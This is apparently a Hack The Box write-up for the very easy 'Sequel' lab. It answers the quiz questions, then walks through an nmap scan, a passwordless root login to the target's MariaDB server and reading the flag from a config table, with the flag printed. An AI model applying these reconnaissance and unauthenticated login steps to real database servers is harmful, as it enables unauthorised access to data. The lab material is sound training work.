# Sequel
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Sequel
* Topic: SQL
* Difficulty: Very easy
* Date: 12-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Tasks
1. What does the acronym SQL stand for? 
 - **Structured Query Language**
2. During our scan, which port running mysql do we find? 
- **3306**
3. What community-developed MySQL version is the target running? 
- **MariaDB**
4. What switch do we need to use in order to specify a login username for the MySQL service? 
- **-u**
5. Which username allows us to log into MariaDB without providing a password? 
- **root**
6. What symbol can we use to specify within the query that we want to display everything inside a table? 
- \*
7. What symbol do we need to end each query with? 
- **;**

---
## Flag:
Nmap scan:

```console
┌──(kali㉿kali)-[~]
└─$ nmap -n -sC -sV 10.129.95.232
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 17:36 EDT
Nmap scan report for 10.129.95.232
Host is up (0.065s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 67
|   Capabilities flags: 63486
|   Some Capabilities: SupportsTransactions, SupportsCompression, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, Support41Auth, FoundRows, SupportsLoadDataLocal, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, ODBCClient, LongColumnFlag, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: 4:fr+{OVC.YY0$bEn|D|
|_  Auth Plugin Name: mysql_native_password
|_sslv2: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 205.29 seconds
```

MyQSL is running on port x. We can connect using `mysql`.

Command:

`mysql -h 10.129.148.58 -u root`

`-h`: Connect to host {IP}.

`-u`: Log on as user {user}.

```console
┌──(kali㉿kali)-[~]
└─$ mysql -h 10.129.148.58 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 225
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

`show databases;` to print the contents of the database.

Remember the `;` at the end of the command.

```
MariaDB [(none)]> show databases;

+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.067 sec)
```

`use htb;` to select table 'htb'.

```
MariaDB [(none)]> use htb;

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

`show tables;` to show the contents of the table.

```
MariaDB [htb]> show tables;

+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.064 sec)
```

`select * from config;` show all entries in the 'config' table.

```
MariaDB [htb]> select * from config;

+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.063 sec)
```

And we got the flag!

**Flag:** `7b4bec00d1a39e3dd4e021ec3d915da8`

---
**Tags:** [[Hack The Box]]